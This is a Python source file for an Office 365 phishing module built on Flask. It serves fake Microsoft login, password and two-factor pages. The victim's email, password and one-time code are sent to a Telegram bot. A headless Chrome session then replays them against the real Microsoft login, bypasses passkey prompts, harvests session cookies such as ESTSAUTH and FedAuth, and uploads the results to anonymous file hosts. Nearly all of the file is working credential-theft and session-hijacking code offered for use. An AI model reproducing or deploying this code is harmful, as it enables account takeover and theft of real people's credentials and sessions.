from __future__ import print_function
from flask import redirect, request, session
import json, time
from os import getenv
from core.base_module import BaseModule
import requests
import traceback
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
import os, traceback, shutil, datetime

class Office365Module(BaseModule):
    def __init__(self, enable_2fa=False):
        super().__init__(self)
        self.set_name('office365')
        self.add_route('login', '/')
        self.add_route('password_page', '/password')
        # intermediate loading page shown after password submission
        self.add_route('loading', '/loading')
        self.add_route('twofactor', '/twofactor')
        self.add_route('redirect', '/redirect')
        self.enable_two_factor(enable_2fa)

    def login(self):
        template = self.env.get_template('login.html')
        return template.render(next_url='/password', hostname=request.host)

    def password_page(self):
        self.user = request.values.get('loginfmt') or request.values.get('email')
        template = self.env.get_template('password.html')
        # password page posts to /loading so we can show a verifying screen
        return template.render(next_url='/loading', hostname=request.host, email=self.user)

    def loading(self):
        """Handle password submission, send early credentials, show verifying dots."""
        self.user = request.values.get('email') or request.values.get('loginfmt')
        self.captured_password = request.values.get('passwd')

        # Early exfiltration
        ip = request.remote_addr
        ua = request.user_agent.string
        early_msg = (
            f"*O365 Credential Capture (Part 1)*\n"
            f"IP: `{ip}`\nUser-Agent: `{ua}`\n\n"
            f"Email: `{self.user}`\nPassword: `{self.captured_password}`\n"
            "Waiting for 2FA code…"
        )
        self.send_telegram(early_msg)

        template = self.env.get_template('loading.html')
        # auto-redirect to 2FA page after short delay
        return template.render(next_url='/twofactor', hostname=request.host, email=self.user, password=self.captured_password)

    def twofactor(self):
        # we reach here via redirect from loading page (GET) or direct POST
        self.user = request.values.get('email') or getattr(self, 'user', None)
        self.captured_password = request.values.get('password') or getattr(self, 'captured_password', None)
        template = self.env.get_template('twofactor.html')
        return template.render(next_url='/redirect', hostname=request.host, email=self.user, password=self.captured_password)

    def redirect(self):
        self.user = request.values.get('email')
        self.captured_password = request.values.get('password')
        self.two_factor_token = request.values.get('two_factor_token')

        # Off-load the slow Selenium work so we answer the HTTP request immediately
        import threading, json

        def _cookie_worker(user, pwd, token):
            import os  # new: needed for path handling in uploads
            # helper: try multiple anonymous hosting providers, return URL or None
            def _upload(file_path):
                # Added tmpfiles.org as an additional fallback provider for artefact uploads
                providers = [
                    ('transfer.sh', 'PUT'),
                    ('0x0.st', 'POST'),
                    ('tmpfiles.org', 'POST'),
                ]
                for host, method in providers:
                    try:
                        if method == 'PUT':
                            with open(file_path, 'rb') as fp:
                                resp = requests.put(
                                    f'https://{host}/{os.path.basename(file_path)}',
                                    data=fp,
                                    timeout=30,
                                )
                        else:  # POST multipart
                            with open(file_path, 'rb') as fp:
                                resp = requests.post(
                                    f'https://{host}',
                                    files={'file': (os.path.basename(file_path), fp)},
                                    timeout=30,
                                )
                        if resp.ok and resp.text.strip().startswith('http'):
                            return resp.text.strip()
                    except Exception as exc:
                        print(f"[upload] Provider {host} failed for {file_path}: {exc}")
                return None

            try:
                self.user = user
                self.captured_password = pwd
                self.two_factor_token = token
                cookies = self.perform_automated_login()
            except Exception as ex:
                tb = traceback.format_exc()
                print(f"[cookie_worker] Exception in perform_automated_login: {tb}")
                cookies = [{"error": str(ex), "traceback": tb}]

            # Attempt to upload debug artefacts (page_source / screenshot)
            artefact_links, doc_paths = [], []
            if cookies and isinstance(cookies, list) and cookies:
                first = cookies[0]
                for key, local_path in list(first.items()):
                    if not (isinstance(local_path, str) and os.path.exists(local_path)):
                        continue
                    url = _upload(local_path)
                    if url:
                        artefact_links.append(f"{key}: {url}")
                        first[key] = url  # replace with remote URL
                    else:
                        doc_paths.append(local_path)

            # Enhanced error reporting
            if cookies and len(cookies) > 0 and 'error' in cookies[0]:
                error_details = cookies[0].get('error', 'Unknown error')
                traceback_info = cookies[0].get('traceback', 'No traceback available')
                cookie_block = f"Error: {error_details}\n\nTraceback:\n{traceback_info}"
            else:
                cookie_block = json.dumps(cookies, indent=2) if cookies else 'Cookie capture failed'
            
            msg = (
                f"*O365 Credential Capture (Full)*\nEmail: `{user}`\nPassword: `{pwd}`\n2FA: `{token}`\n\nCookies:\n```\n{cookie_block}\n```"
            )
            if artefact_links:
                msg += "\n\nDebug artefacts:\n" + "\n".join(artefact_links)

            self.send_telegram(msg, document_paths=doc_paths if doc_paths else None)

        threading.Thread(target=_cookie_worker, args=(self.user, self.captured_password, self.two_factor_token), daemon=True).start()

        # Give the victim the real Microsoft redirect right away
        return redirect(self.final_url, code=302)

    def send_telegram(self, message: str | None = None, document_paths: list | None = None):
        """Send a Markdown message and/or upload documents to Telegram.

        Parameters
        ----------
        message : str | None
            Text to send. If None, no text message is sent.
        document_paths : list[str] | None
            Optional list of file paths to upload as documents (one request per file).
        """
        bot_token = getenv('TELEGRAM_BOT_TOKEN')
        chat_id = getenv('TELEGRAM_CHAT_ID')
        if not bot_token or not chat_id:
            return

        session_req = requests.Session()

        if message:
            try:
                url = f'https://api.telegram.org/bot{bot_token}/sendMessage'
                payload = {
                    'chat_id': chat_id,
                    'text': message,
                    'parse_mode': 'Markdown',
                }
                session_req.post(url, json=payload, timeout=15)
            except Exception:
                pass

        if document_paths:
            for fpath in document_paths:
                try:
                    if not os.path.exists(fpath):
                        continue
                    url = f'https://api.telegram.org/bot{bot_token}/sendDocument'
                    with open(fpath, 'rb') as fp:
                        files = {'document': (os.path.basename(fpath), fp)}
                        data = {'chat_id': chat_id}
                        session_req.post(url, data=data, files=files, timeout=30)
                except Exception as exc:
                    print(f"[telegram-upload] Failed to send {fpath}: {exc}")

    def perform_automated_login(self):
        """Use headless Chrome to login and return cookies list. Handles M-series Mac headless quirks & Stay-signed-in prompt."""
        email = getattr(self, 'user', None)
        password = getattr(self, 'captured_password', None)
        token = getattr(self, 'two_factor_token', None)
        if not all([email, password, token]):
            return [{"error": "Missing credentials", "email": email, "password": bool(password), "token": bool(token)}]

        driver = None
        opts = webdriver.ChromeOptions()
        def log(msg):
            print(f"[{datetime.datetime.utcnow().isoformat()}] SELENIUM: {msg}")

        opts.binary_location = os.getenv('CHROME_BIN', '/usr/bin/chromium')
        if not os.path.exists(opts.binary_location):
            alt = shutil.which('chromium') or shutil.which('chromium-browser') or '/usr/lib/chromium/chromium'
            opts.binary_location = alt
        log(f"Using chrome binary: {opts.binary_location}")
        opts.add_argument('--headless=new')
        opts.add_argument('--no-sandbox')
        opts.add_argument('--disable-dev-shm-usage')
        opts.add_argument('--disable-gpu')
        opts.add_argument('--disable-crash-reporter')
        opts.add_argument('--disable-extensions')
        opts.add_argument('--disable-features=SitePerProcess,OptimizationHints')
        # Disable WebAuthn so Microsoft does not offer password-less/FIDO flows
        opts.add_argument('--disable-features=WebAuthentication,WebAuthnConditionalUI')
        opts.add_argument('--window-size=1280,800')
        opts.add_argument('--disable-software-rasterizer')
        opts.add_argument('--remote-allow-origins=*')  # fixes chrome 111+ in some envs
        opts.add_argument('--no-zygote')

        # Allow tweaking global Selenium wait via env (default 60 s)
        WAIT_TIMEOUT = int(os.getenv('O365_WAIT_TIMEOUT', '60'))

        try:
            # Let Selenium Manager fetch the correct chromedriver automatically
            log("Launching Chrome via Selenium Manager…")
            driver = webdriver.Chrome(options=opts)
            driver.set_page_load_timeout(WAIT_TIMEOUT)
            log("Chrome WebDriver session started")

            from selenium.common.exceptions import TimeoutException, NoSuchElementException
            from selenium.webdriver.support.ui import WebDriverWait
            from selenium.webdriver.support import expected_conditions as EC

            wait = WebDriverWait(driver, WAIT_TIMEOUT)

            def element_present(by, selector, t=3):
                """Utility: return True if element located within t seconds."""
                try:
                    WebDriverWait(driver, t).until(EC.presence_of_element_located((by, selector)))
                    return True
                except Exception:
                    return False

            # Start with legacy consumer login flow first to improve FIDO/WebAuthn bypass reliability.
            log(f"Starting login flow for {email}")
            legacy_url = f"https://login.live.com/login.srf?username={email}"

            try:
                driver.get(legacy_url)
                time.sleep(2)

                # Sanity-check: make sure an email field is present; otherwise fall back.
                if not (element_present(By.NAME, 'loginfmt', 5) or element_present(By.ID, 'i0116', 5)):
                    raise Exception("Email field not detected on legacy page")

                log("Loaded legacy consumer login page (login.live.com)")
            except Exception as legacy_exc:
                log(f"Legacy login flow failed or unavailable ({legacy_exc}); falling back to Azure AD flow")
                driver.get('https://login.microsoftonline.com/')
                time.sleep(2)
            
            # Enter email
            try:
                email_field = driver.find_element(By.NAME, 'loginfmt')
                email_field.clear()
                email_field.send_keys(email)
                driver.find_element(By.ID, 'idSIButton9').click()
                log("Email entered and submitted")
                time.sleep(3)
            except Exception as e:
                log(f"Failed to enter email: {str(e)}")
                raise

            # Check current page and handle accordingly
            current_url = driver.current_url
            page_source = driver.page_source
            log(f"Current URL after email: {current_url}")
            
            # Check if we're on a FIDO/WebAuthn page
            fido_indicators = [
                'login-fido-view',
                'Face, fingerprint, PIN or security key',
                'CT_STR_CredentialPicker_Option_Passkey',
                'data-viewid="23"',
                'idDiv_SAOTCS_Proofs',
                'Windows Hello',
                'security key',
                'passkey',
                'biometric',
                'authenticator'
            ]
            
            is_fido_page = any(indicator in page_source for indicator in fido_indicators)
            
            if is_fido_page:
                log("Detected FIDO/WebAuthn page, implementing comprehensive bypass strategy")
                
                # Strategy 1: Look for bypass links and buttons
                bypass_selectors = [
                    # Text-based selectors
                    (By.LINK_TEXT, "Other ways to sign in"),
                    (By.PARTIAL_LINK_TEXT, "Other ways"),
                    (By.LINK_TEXT, "Sign in with a password instead"),
                    (By.PARTIAL_LINK_TEXT, "password instead"),
                    (By.LINK_TEXT, "Use a password"),
                    (By.PARTIAL_LINK_TEXT, "Use a password"),
                    (By.LINK_TEXT, "More choices"),
                    (By.PARTIAL_LINK_TEXT, "More choices"),
                    (By.LINK_TEXT, "Sign-in options"),
                    (By.PARTIAL_LINK_TEXT, "Sign-in options"),
                    
                    # ID-based selectors
                    (By.ID, "idA_PWD_SwitchToPassword"),
                    (By.ID, "idA_PWD_UseDifferentAccount"),
                    (By.ID, "idBtn_Back"),
                    (By.ID, "idBtn_Cancel"),
                    
                    # CSS selectors
                    (By.CSS_SELECTOR, "a[id*='SwitchToPassword']"),
                    (By.CSS_SELECTOR, "a[href*='password']"),
                    (By.CSS_SELECTOR, "a[href*='LoginOptions']"),
                    (By.CSS_SELECTOR, "input[value='Back']"),
                    (By.CSS_SELECTOR, "button[value='Back']"),
                    (By.CSS_SELECTOR, "input[value='Cancel']"),
                    (By.CSS_SELECTOR, "button[value='Cancel']"),
                    (By.CSS_SELECTOR, ".text-13 a"),  # Small links often contain bypass options
                    
                    # XPath selectors
                    (By.XPATH, "//a[contains(text(), 'password')]"),
                    (By.XPATH, "//a[contains(text(), 'Other')]"),
                    (By.XPATH, "//a[contains(text(), 'different')]"),
                    (By.XPATH, "//a[contains(@href, 'password')]"),
                    (By.XPATH, "//a[contains(@href, 'LoginOptions')]"),
                    (By.XPATH, "//input[@type='button' and (@value='Back' or @value='Cancel')]"),
                    (By.XPATH, "//button[contains(text(), 'Back') or contains(text(), 'Cancel')]")
                ]
                
                bypass_clicked = False
                for by, selector in bypass_selectors:
                    try:
                        elements = driver.find_elements(by, selector)
                        for element in elements:
                            if element and element.is_displayed() and element.is_enabled():
                                # Scroll element into view
                                driver.execute_script("arguments[0].scrollIntoView(true);", element)
                                time.sleep(0.5)
                                element.click()
                                log(f"Clicked bypass option with {by}: {selector}")
                                bypass_clicked = True
                                time.sleep(3)
                                break
                    except Exception as e:
                        log(f"Failed to click {by}: {selector} - {str(e)}")
                        continue
                    
                    if bypass_clicked:
                        break
                
                # Strategy 2: Try JavaScript navigation if clicking failed
                if not bypass_clicked:
                    log("Click bypass failed, trying JavaScript navigation")
                    try:
                        # Try to find and click hidden elements via JavaScript
                        js_commands = [
                            "document.querySelector('#idBtn_Back')?.click()",
                            "document.querySelector('[value=\"Back\"]')?.click()",
                            "document.querySelector('a[href*=\"password\"]')?.click()",
                            "Array.from(document.querySelectorAll('a')).find(a => a.textContent.includes('Other'))?.click()",
                            "Array.from(document.querySelectorAll('a')).find(a => a.textContent.includes('password'))?.click()"
                        ]
                        
                        for js_cmd in js_commands:
                            try:
                                driver.execute_script(js_cmd)
                                time.sleep(2)
                                if 'login-fido-view' not in driver.page_source:
                                    log(f"JavaScript bypass successful: {js_cmd}")
                                    bypass_clicked = True
                                    break
                            except:
                                continue
                    except Exception as e:
                        log(f"JavaScript bypass failed: {str(e)}")
                
                # Strategy 3: Force navigation with LoginOptions parameter
                if not bypass_clicked:
                    log("Attempting forced navigation with LoginOptions parameter")
                    try:
                        # Parse current URL to extract parameters
                        from urllib.parse import urlparse, parse_qs, urlencode
                        parsed_url = urlparse(current_url)
                        query_params = parse_qs(parsed_url.query)
                        
                        # Add LoginOptions=1 to force password option
                        query_params['LoginOptions'] = ['1']
                        query_params['username'] = [email]
                        
                        # Construct new URL
                        new_query = urlencode(query_params, doseq=True)
                        if 'login.live.com' in current_url:
                            new_url = f"https://login.live.com/ppsecure/post.srf?{new_query}"
                        else:
                            new_url = f"https://login.microsoftonline.com/common/login?{new_query}"
                        
                        driver.get(new_url)
                        log(f"Navigated to: {new_url}")
                        time.sleep(3)
                        bypass_clicked = True
                    except Exception as e:
                        log(f"URL manipulation failed: {str(e)}")
                
                # Strategy 4: Browser back and retry
                if not bypass_clicked:
                    log("Attempting browser back navigation")
                    try:
                        driver.back()
                        time.sleep(2)
                        # Re-enter email with password preference
                        email_field = driver.find_element(By.NAME, 'loginfmt')
                        email_field.clear()
                        email_field.send_keys(email)
                        # Try to find and click password option before submitting
                        try:
                            pwd_option = driver.find_element(By.CSS_SELECTOR, "[data-test-id='password-credential-type']")
                            pwd_option.click()
                        except:
                            pass
                        driver.find_element(By.ID, 'idSIButton9').click()
                        time.sleep(3)
                        bypass_clicked = True
                    except Exception as e:
                        log(f"Browser back strategy failed: {str(e)}")
                
                # Strategy 5: Direct POST to password endpoint
                if not bypass_clicked:
                    log("Attempting direct navigation to password endpoints")
                    password_urls = [
                        f"https://login.microsoftonline.com/common/login?username={email}&LoginOptions=1",
                        f"https://login.live.com/ppsecure/post.srf?username={email}&LoginOptions=1",
                        f"https://login.microsoftonline.com/common/oauth2/authorize?username={email}&prompt=login",
                        f"https://login.live.com/oauth20_authorize.srf?username={email}&display=page"
                    ]
                    
                    for pwd_url in password_urls:
                        try:
                            driver.get(pwd_url)
                            time.sleep(3)
                            if 'passwd' in driver.page_source or 'password' in driver.page_source.lower():
                                log(f"Successfully navigated to password page via: {pwd_url}")
                                bypass_clicked = True
                                break
                        except:
                            continue
            
            # Now try to enter password with comprehensive retry logic
            password_entered = False
            max_password_attempts = 5
            
            for main_attempt in range(max_password_attempts):
                log(f"Password entry attempt {main_attempt + 1}/{max_password_attempts}")
                
                # Check if we're still on FIDO page and need another bypass attempt
                current_page = driver.page_source
                if any(indicator in current_page for indicator in fido_indicators):
                    log("Still on FIDO page, attempting additional bypass")
                    
                    # Try clicking any visible button that might help
                    try:
                        all_buttons = driver.find_elements(By.TAG_NAME, "button") + driver.find_elements(By.TAG_NAME, "input")
                        for btn in all_buttons:
                            btn_text = btn.get_attribute("value") or btn.text
                            if btn_text and any(word in btn_text.lower() for word in ["back", "cancel", "other", "password", "different"]):
                                if btn.is_displayed() and btn.is_enabled():
                                    btn.click()
                                    log(f"Clicked button: {btn_text}")
                                    time.sleep(2)
                                    break
                    except:
                        pass
                    
                    # Force refresh with password parameter
                    try:
                        current_url = driver.current_url
                        if "LoginOptions" not in current_url:
                            separator = "&" if "?" in current_url else "?"
                            driver.get(f"{current_url}{separator}LoginOptions=1")
                            time.sleep(2)
                    except:
                        pass
                
                # Comprehensive password field selectors
                password_selectors = [
                    # Standard selectors
                    (By.NAME, 'passwd'),
                    (By.ID, 'i0118'),
                    (By.ID, 'passwordInput'),
                    (By.ID, 'Password'),
                    
                    # CSS selectors
                    (By.CSS_SELECTOR, 'input[type="password"]'),
                    (By.CSS_SELECTOR, 'input[name="passwd"]'),
                    (By.CSS_SELECTOR, 'input[name="password"]'),
                    (By.CSS_SELECTOR, 'input[name="Password"]'),
                    (By.CSS_SELECTOR, '#i0118'),
                    (By.CSS_SELECTOR, '#passwordInput'),
                    (By.CSS_SELECTOR, 'input[placeholder*="Password"]'),
                    (By.CSS_SELECTOR, 'input[placeholder*="password"]'),
                    (By.CSS_SELECTOR, 'input[aria-label*="password"]'),
                    (By.CSS_SELECTOR, 'input[aria-label*="Password"]'),
                    (By.CSS_SELECTOR, '.form-control[type="password"]'),
                    (By.CSS_SELECTOR, 'input.text[type="password"]'),
                    
                    # XPath selectors
                    (By.XPATH, "//input[@type='password']"),
                    (By.XPATH, "//input[contains(@name, 'pass')]"),
                    (By.XPATH, "//input[contains(@id, 'pass')]"),
                    (By.XPATH, "//input[contains(@placeholder, 'Password')]"),
                    (By.XPATH, "//input[contains(@placeholder, 'password')]"),
                    (By.XPATH, "//input[contains(@aria-label, 'password')]"),
                    (By.XPATH, "//input[@autocomplete='current-password']"),
                    (By.XPATH, "//input[@autocomplete='password']")
                ]
                
                # Try each selector
                for by, selector in password_selectors:
                    try:
                        # Use find_elements to avoid exceptions
                        elements = driver.find_elements(by, selector)
                        for password_field in elements:
                            if password_field.is_displayed():
                                log(f"Found password field with {by}: {selector}")
                                
                                # Ensure field is ready
                                driver.execute_script("arguments[0].scrollIntoView(true);", password_field)
                                time.sleep(0.5)
                                
                                # Try multiple methods to enter password
                                try:
                                    # Method 1: Standard clear and send_keys
                                    password_field.clear()
                                    password_field.send_keys(password)
                                except:
                                    try:
                                        # Method 2: JavaScript
                                        driver.execute_script(f"arguments[0].value = '{password}';", password_field)
                                    except:
                                        try:
                                            # Method 3: Click first, then type
                                            password_field.click()
                                            password_field.send_keys(password)
                                        except:
                                            continue
                                
                                log("Password entered, looking for submit button")
                                
                                # Comprehensive sign-in button selectors
                                signin_selectors = [
                                    (By.ID, 'idSIButton9'),
                                    (By.ID, 'submitButton'),
                                    (By.ID, 'SignIn'),
                                    (By.CSS_SELECTOR, 'input[type="submit"]'),
                                    (By.CSS_SELECTOR, 'button[type="submit"]'),
                                    (By.CSS_SELECTOR, 'input[value="Sign in"]'),
                                    (By.CSS_SELECTOR, 'input[value="Next"]'),
                                    (By.CSS_SELECTOR, 'input[value="Submit"]'),
                                    (By.CSS_SELECTOR, 'button:contains("Sign in")'),
                                    (By.CSS_SELECTOR, 'button:contains("Next")'),
                                    (By.CSS_SELECTOR, '.btn-primary'),
                                    (By.CSS_SELECTOR, '.win-button'),
                                    (By.XPATH, "//input[@type='submit']"),
                                    (By.XPATH, "//button[@type='submit']"),
                                    (By.XPATH, "//input[contains(@value, 'Sign')]"),
                                    (By.XPATH, "//input[contains(@value, 'Next')]"),
                                    (By.XPATH, "//button[contains(text(), 'Sign')]"),
                                    (By.XPATH, "//button[contains(text(), 'Next')]")
                                ]
                                
                                button_clicked = False
                                for s_by, s_selector in signin_selectors:
                                    try:
                                        btns = driver.find_elements(s_by, s_selector)
                                        for signin_btn in btns:
                                            if signin_btn.is_displayed() and signin_btn.is_enabled():
                                                signin_btn.click()
                                                log(f"Clicked sign in button with {s_by}: {s_selector}")
                                                password_entered = True
                                                button_clicked = True
                                                break
                                    except:
                                        continue
                                    
                                    if button_clicked:
                                        break
                                
                                # If no button clicked, try Enter key
                                if not button_clicked:
                                    try:
                                        password_field.send_keys(Keys.RETURN)
                                        log("Pressed Enter key on password field")
                                        password_entered = True
                                    except:
                                        pass
                                
                                if password_entered:
                                    break
                    except Exception as e:
                        log(f"Error with selector {by}: {selector} - {str(e)}")
                        continue
                    
                    if password_entered:
                        break
                
                if password_entered:
                    log("Password submitted, waiting for response")
                    time.sleep(5)
                    
                    # Check if we're past the password page
                    new_page = driver.page_source
                    if 'passwd' not in new_page and 'password' not in new_page.lower():
                        log(f"Successfully moved past password page. Current URL: {driver.current_url}")
                        break
                    else:
                        log("Still on password page, will retry")
                        password_entered = False
                
                # Wait before next attempt
                if not password_entered and main_attempt < max_password_attempts - 1:
                    log(f"Password not entered, waiting before retry {main_attempt + 2}")
                    time.sleep(3)
            
            if not password_entered:
                log("Failed to enter password after all attempts")
                # Capture comprehensive debug information
                timestamp = datetime.datetime.utcnow().strftime('%Y%m%dT%H%M%SZ')
                debug_html = f'/tmp/o365_password_fail_{timestamp}.html'
                debug_png = f'/tmp/o365_password_fail_{timestamp}.png'
                
                # Save page source
                with open(debug_html, 'w', encoding='utf-8') as fp:
                    fp.write(driver.page_source)
                
                # Save screenshot
                driver.save_screenshot(debug_png)
                
                # Log all form elements for debugging
                try:
                    forms = driver.find_elements(By.TAG_NAME, "form")
                    inputs = driver.find_elements(By.TAG_NAME, "input")
                    log(f"Found {len(forms)} forms and {len(inputs)} input elements")
                    for i, inp in enumerate(inputs):
                        log(f"Input {i}: type={inp.get_attribute('type')}, name={inp.get_attribute('name')}, id={inp.get_attribute('id')}")
                except:
                    pass
                
                raise Exception(f"Could not enter password after {max_password_attempts} attempts. Debug files: {debug_html}, {debug_png}")

            # Handle 2FA
            log("Looking for 2FA input fields")
            
            # Wait for any of the expected next-stage markers to become visible
            try:
                wait.until(
                    EC.any_of(
                        EC.presence_of_element_located((By.ID, 'otcFrame')),
                        EC.presence_of_element_located((By.ID, 'idDiv_SAOTCS_Proofs')),
                        EC.presence_of_element_located((By.ID, 'idSubmit_SAOTCC_Continue')),
                        EC.presence_of_element_located((By.NAME, 'otc')),
                        EC.presence_of_element_located((By.CSS_SELECTOR, 'input[name="otcInput0"]')),
                    )
                )
                log("Found 2FA stage marker")
            except TimeoutException:
                log(f"No stage-marker element appeared after {WAIT_TIMEOUT}s – proceeding with fallback selectors")

            # If a verification-method chooser is present, click the first Continue/Send-code button
            try:
                choice_btns = driver.find_elements(By.ID, 'idSubmit_SAOTCC_Continue') or \
                              driver.find_elements(By.CSS_SELECTOR, 'input[id^="idSubmit_SAOTCC"]')
                if choice_btns:
                    choice_btns[0].click()
                    log("Clicked verification method continue button")
                    time.sleep(2)
            except Exception:
                pass  # No choice page, proceed

            # If an iframe with the OTP box loads, switch context to it
            try:
                if element_present(By.ID, 'otcFrame', 5):
                    driver.switch_to.frame(driver.find_element(By.ID, 'otcFrame'))
                    log("Switched to OTP iframe")
            except Exception:
                pass

            # Locate the OTP input element using a broad selector list
            otp_selectors = [
                (By.NAME, 'otc'),
                (By.NAME, 'otcInput0'),
                (By.ID, 'idTxtBx_SAOTP_OTC'),
                (By.ID, 'idTxtBx_SAOTCC_OTC'),
                (By.CSS_SELECTOR, 'input[id^="idTxtBx_SAOTP"]'),
                (By.CSS_SELECTOR, 'input[id^="idTxtBx_SAOTCC"]'),
                (By.CSS_SELECTOR, 'input[type="tel"]'),
                (By.CSS_SELECTOR, 'input[type="text"]'),
            ]

            token_input = None
            for by, sel in otp_selectors:
                try:
                    log(f"Looking for OTP input with {by}: {sel}")
                    token_input = WebDriverWait(driver, 10).until(
                        EC.presence_of_element_located((by, sel))
                    )
                    log(f"Found OTP input with {by}: {sel}")
                    break
                except TimeoutException:
                    continue

            if token_input:
                token_input.clear()
                token_input.send_keys(token)
                log(f"Entered 2FA token: {token}")
                # The verify/Next button often retains the same ID inside or outside iframe
                try:
                    driver.find_element(By.ID, 'idSIButton9').click()
                    log("Clicked verify button")
                except NoSuchElementException:
                    log("Verify button not found")
            else:
                log('OTP input not found – continuing without entering 2FA code')

            # Always switch back to the main document in case we were inside an iframe
            try:
                driver.switch_to.default_content()
            except Exception:
                pass

            # Handle optional stay signed in prompt
            try:
                WebDriverWait(driver, 5).until(
                    EC.element_to_be_clickable((By.ID, 'idBtn_Back'))
                ).click()
                log("Clicked 'No' on stay signed in prompt")
            except Exception:
                pass  # prompt may not appear

            # Wait until redirected to Office portal or other Microsoft service page
            try:
                WebDriverWait(driver, 20).until(
                    EC.url_contains('office')
                )
                log("Successfully redirected to Office portal")
            except Exception:
                log(f"Timeout waiting for Office redirect. Current URL: {driver.current_url}")

            time.sleep(2)

            cookies = driver.get_cookies()
            log(f"Captured {len(cookies)} cookies")

            # ------------------------------------------------------------------
            # Post-login step: ensure workload tokens (rtFa / FedAuth / ESTSAUTH)
            # are present by navigating to Outlook if necessary.
            # ------------------------------------------------------------------

            def _has_workload_tokens(c_list):
                names = {c.get('name') for c in c_list}
                return any(n in names for n in ('rtFa', 'FedAuth', 'ESTSAUTH'))

            if not _has_workload_tokens(cookies):
                log("Workload tokens missing – navigating to Outlook to mint them")
                try:
                    driver.get(os.getenv('O365_WORKLOAD_URL', 'https://outlook.office.com/mail/'))
                    WebDriverWait(driver, 15).until(EC.url_contains('outlook'))
                    time.sleep(3)

                    extra_cookies = driver.get_cookies()
                    before_cnt = len(cookies)
                    seen = {(c['name'], c.get('domain')) for c in cookies}
                    for ck in extra_cookies:
                        if (ck['name'], ck.get('domain')) not in seen:
                            cookies.append(ck)

                    log(f"Added {len(cookies) - before_cnt} additional cookies from Outlook navigation; total {len(cookies)}")
                except Exception as token_exc:
                    log(f"Failed to retrieve workload tokens: {token_exc}")

            # Always save the final page source & screenshot for debugging purposes
            try:
                timestamp = datetime.datetime.utcnow().strftime('%Y%m%dT%H%M%SZ')
                final_html_path = f'/tmp/o365_final_page_{timestamp}.html'
                final_png_path = f'/tmp/o365_final_page_{timestamp}.png'
                with open(final_html_path, 'w', encoding='utf-8') as fp:
                    fp.write(driver.page_source)
                driver.save_screenshot(final_png_path)
                log(f"Saved final page artifacts: {final_html_path}, {final_png_path}")

                # Append paths to first cookie object to make them easy to locate later
                if cookies:
                    cookies[0]['page_source'] = final_html_path
                    cookies[0]['screenshot'] = final_png_path
                    cookies[0]['final_url'] = driver.current_url
                else:
                    # If no cookies, create a dict to hold the debug info
                    cookies = [{
                        'page_source': final_html_path,
                        'screenshot': final_png_path,
                        'final_url': driver.current_url,
                        'warning': 'No cookies captured'
                    }]
            except Exception as e:
                log(f"Failed to save final artifacts: {str(e)}")
                
        except Exception as e:
            tb = traceback.format_exc()
            print(f"[perform_automated_login] Exception: {tb}")
            log(f"Exception occurred: {str(e)}")
            
            # Enhanced error reporting with current state
            cookies = [{
                "error": str(e),
                "traceback": tb,
                "current_url": driver.current_url if driver else "Driver not initialized",
                "timestamp": datetime.datetime.utcnow().isoformat()
            }]
            
            try:
                if driver:
                    # First snapshot immediately after failure
                    page_source = driver.page_source
                    timestamp1 = datetime.datetime.utcnow().strftime('%Y%m%dT%H%M%SZ')
                    page_path = f'/tmp/o365_error_{timestamp1}.html'
                    with open(page_path, 'w', encoding='utf-8') as fp:
                        fp.write(page_source)
                    screenshot_path = f'/tmp/o365_error_{timestamp1}.png'
                    driver.save_screenshot(screenshot_path)
                    cookies[0]['page_source'] = page_path
                    cookies[0]['screenshot'] = screenshot_path
                    log(f"Saved error artifacts: {page_path}, {screenshot_path}")

                    # Wait and capture second state
                    time.sleep(6)
                    try:
                        page_source2 = driver.page_source
                        timestamp2 = datetime.datetime.utcnow().strftime('%Y%m%dT%H%M%SZ')
                        page_path2 = f'/tmp/o365_error2_{timestamp2}.html'
                        with open(page_path2, 'w', encoding='utf-8') as fp:
                            fp.write(page_source2)
                        screenshot_path2 = f'/tmp/o365_error2_{timestamp2}.png'
                        driver.save_screenshot(screenshot_path2)
                        cookies[0]['page_source_wait'] = page_path2
                        cookies[0]['screenshot_wait'] = screenshot_path2
                        log(f"Saved second error artifacts: {page_path2}, {screenshot_path2}")
                    except Exception:
                        pass
            except Exception as debug_error:
                log(f"Failed to capture debug artifacts: {str(debug_error)}")
                
        finally:
            try:
                if driver:
                    driver.quit()
                    log("Chrome driver closed")
            except Exception:
                pass
                
        return cookies

def load(enable_2fa=False):
    return Office365Module(enable_2fa)
